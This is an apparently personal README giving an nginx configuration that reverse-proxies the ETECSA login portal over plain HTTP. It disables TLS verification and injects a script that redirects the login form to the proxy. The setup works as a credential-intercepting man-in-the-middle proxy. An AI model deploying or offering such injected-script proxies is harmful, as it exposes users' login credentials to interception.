# Router Project


## Nginx

```
map '' $patch {
    default  '<script>(function(){var t=setInterval(function(){var f=document.getElementById(\'formulario\');if(f&&f.action){f.action=f.action.replace(\'https://secure.etecsa.net:8443\',\'http://192.168.1.222\').replace(\'//LoginServlet\',\'/LoginServlet\');clearInterval(t);}},100);setTimeout(function(){clearInterval(t);},1000);})();</script></head>';
}

server {
    listen 80;
    server_name 192.168.1.222;

    location / {
        proxy_pass https://secure.etecsa.net:8443/;
        proxy_set_header Host secure.etecsa.net:8443;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        proxy_ssl_verify off;
        proxy_ssl_server_name on;

        proxy_redirect https://secure.etecsa.net:8443/ /;
        proxy_cookie_path / /;
        proxy_cookie_domain secure.etecsa.net 192.168.1.222;

        # opcionales
        proxy_buffering off;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";

        proxy_set_header Accept-Encoding "";
        gzip off;

        sub_filter_once off;
        sub_filter_types text/html;
        sub_filter '</head>'  $patch;
    }
}
```